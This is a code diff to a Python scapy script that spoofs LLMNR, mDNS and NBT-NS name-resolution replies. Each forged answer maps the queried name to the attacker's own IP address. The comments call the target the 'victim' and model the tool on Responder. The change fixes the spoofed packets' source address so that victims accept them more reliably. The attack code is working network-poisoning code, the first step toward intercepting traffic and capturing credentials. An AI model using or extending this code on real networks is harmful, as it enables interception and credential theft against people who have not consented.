@@ -70,7 +70,11 @@ def build_response(pkt, our_ip: str):
         if qd0 is None or not getattr(qd0, "qname", None):   # malformed question
             return None
         ttl = 30 if port == _LLMNR_PORT else 120
-        return (IP(src=pkt[IP].dst, dst=pkt[IP].src)
+        # Source from OUR unicast IP, not pkt[IP].dst: LLMNR/mDNS queries are sent
+        # to a multicast group (224.0.0.252 / 224.0.0.251), so echoing that as the
+        # answer's source is a multicast src address (RFC 1122 violation) the
+        # victim's stack may drop. Responder-style: answer from our own address.
+        return (IP(src=our_ip, dst=pkt[IP].src)
                 / UDP(sport=port, dport=pkt[UDP].sport)
                 / DNS(id=q.id, qr=1, aa=1, qd=q.qd,
                       an=DNSRR(rrname=qd0.qname, type="A", ttl=ttl, rdata=our_ip)))
@@ -89,7 +93,9 @@ def build_response(pkt, our_ip: str):
                 # in current scapy); echo it so the victim accepts the answer
                 hdr = pkt.getlayer(NBNSHeader)
                 trn = int(hdr.NAME_TRN_ID) if hdr is not None else 0
-                return (IP(src=pkt[IP].dst, dst=pkt[IP].src)
+                # NBT-NS queries are sent to the subnet broadcast; source the
+                # answer from our own IP (see the LLMNR/mDNS note above).
+                return (IP(src=our_ip, dst=pkt[IP].src)
                         / UDP(sport=_NBNS_PORT, dport=pkt[UDP].sport)
                         / NBNSHeader(NAME_TRN_ID=trn, RESPONSE=1, OPCODE=0,
                                      NM_FLAGS=0x1, ANCOUNT=1)
